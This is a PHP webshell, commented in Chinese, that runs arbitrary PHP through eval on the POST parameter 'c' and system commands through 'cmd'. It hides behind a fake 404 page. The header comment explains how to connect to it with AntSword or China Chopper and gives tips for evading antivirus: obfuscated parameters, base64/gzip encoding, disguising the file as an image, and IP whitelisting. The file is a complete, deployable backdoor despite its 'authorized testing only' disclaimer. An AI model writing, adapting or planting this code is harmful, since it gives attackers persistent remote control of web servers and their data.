<?php
/*
 * 脚本名称: PHP 一句话木马 / 迷你命令执行 WebShell（带口令与落地自检测试）
 * 方向: Web（文件上传 / RCE）
 * 简介:
 *   - 一句话模式: POST 参数 c 为任意 PHP 代码（用中国蚁剑/菜刀连接，密码 c）
 *       用法:  POST http://target/shell.php   body: c=system('id');
 *   - 命令模式:   POST 参数 cmd 直接执行系统命令并回显
 *       用法:  POST http://target/shell.php   body: cmd=whoami
 *              GET  http://target/shell.php?cmd=id
 *   - 自检:      php webshell_php.php  (CLI 本地验证代码可解析)
 * 隐蔽/免杀提示（仅授权环境）:
 *   1) 改参数名 c/cmd 为不常见名字；2) 用 $_POST 变量拼接、base64/gzip 解压；
 *   3) 上传后改名为图片扩展名配合 .htaccess/解析漏洞；4) 加 Referer/IP 白名单。
 * 注意: 仅限授权测试与 CTF 靶场，非法使用需自行承担法律责任。
 */

error_reporting(0);

/* ---- 一句话：密码 c（蚁剑/菜刀连接类型 PHP） ---- */
if (isset($_POST['c'])) {
    @eval($_POST['c']);
    exit;
}

/* ---- 命令执行：参数 cmd ---- */
if (isset($_REQUEST['cmd'])) {
    header('Content-Type: text/plain; charset=utf-8');
    $cmd = $_REQUEST['cmd'];
    if (function_exists('system')) {
        system($cmd);
    } elseif (function_exists('passthru')) {
        passthru($cmd);
    } elseif (function_exists('shell_exec')) {
        echo shell_exec($cmd);
    } else {
        $f = popen($cmd, 'r');
        while (!feof($f)) { echo fread($f, 4096); }
        pclose($f);
    }
    exit;
}

/* ---- 无参数访问时返回伪装 404 页面 ---- */
http_response_code(404);
echo "<!doctype html><title>404 Not Found</title><h1>Not Found</h1>";
?>
